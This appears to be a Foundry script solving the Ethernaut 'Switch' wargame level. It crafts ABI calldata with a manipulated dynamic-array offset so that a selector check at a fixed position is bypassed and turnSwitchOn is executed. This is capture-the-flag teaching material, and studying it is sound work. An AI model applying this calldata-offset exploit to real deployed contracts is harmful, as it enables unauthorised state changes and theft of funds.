// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Switch} from "ethernaut/levels/Switch.sol";

contract Check is CheckScript("SWITCH") {}

contract Solve is SolveScript("SWITCH") {
    Switch target;

    constructor() {
        target = Switch(instance);
    }

    function attack() public override {
        bytes memory data = abi.encode(
            uint256(0x60), // sets array offset to our desired location
            uint256(0x00), // ignored, can be all zeros; would be 4 normally
            Switch.turnSwitchOff.selector, // checked by `onlyOff` in assembly
            uint256(0x04), // offset points here as length, 4 bytes
            Switch.turnSwitchOn.selector // actual value in 4 bytes
        );

        (bool ok,) = address(target).call(bytes.concat(Switch.flipSwitch.selector, data));
        require(ok, "failed call");
    }
}
